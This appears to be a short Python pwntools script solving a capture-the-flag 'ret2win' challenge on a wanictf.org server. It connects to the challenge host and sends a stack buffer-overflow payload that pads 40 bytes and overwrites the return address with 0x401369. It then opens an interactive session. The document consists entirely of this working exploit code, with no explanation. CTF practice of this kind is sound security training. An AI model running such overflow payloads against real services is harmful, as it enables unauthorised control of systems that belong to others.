from pwn import *

io = remote('ret2win-pwn.wanictf.org', 9003)

target = p64(0x0000000000401369)
offset = 48 - len(target)
message = b'a' * offset + target
print(message)

io.recvuntil('>')
io.sendline(message)
io.interactive()
print(io.recvrepeat())